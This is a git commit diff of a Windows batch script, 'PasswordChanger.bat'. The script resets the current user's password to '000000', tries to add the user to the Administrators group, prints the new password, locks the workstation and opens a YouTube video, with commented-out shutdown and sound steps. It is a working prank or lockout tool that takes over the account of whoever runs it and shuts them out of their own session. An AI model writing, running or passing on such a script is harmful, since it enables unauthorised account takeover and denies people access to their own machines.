07dccb349fc123434dfbe9ca34ac339d18908741
Moddy Nightt <slimaneabaziz76@gmail.com>
2024-09-19 17:52:19 +0100

    Update PasswordChanger.bat

--- PasswordChanger.bat
+++ PasswordChanger.bat
@@ -1,9 +1,24 @@
 @echo off
 set username=%USERNAME%
-set passwrd=0000
-echo the user name is :  %username%
+set newpassword=000000
 
-net user %username% %passwrd%
+:: Add the user to the Administrators group
+net localgroup Administrators [%username%] /add
 
+:: Change the user's password
+net user %username% %newpassword%
+
+echo The username is: %username%
+echo The new password is: %newpassword%
+
+:: Lock the workstation
 rundll32.exe user32.dll, LockWorkStation
+
+:: Open YouTube in Microsoft Edge
 powershell -Command "Start-Process 'msedge.exe' 'https://www.youtube.com/watch?v=f3BPx2lt6E0&autoplay=1'"
+
+:: Optional: Shutdown the computer after 15 seconds
+::shutdown.exe /s /t 15
+
+:: Optional: Play a sound file
+start /min mplay32 /play /close "C:\path\to\your\soundfile.wav"
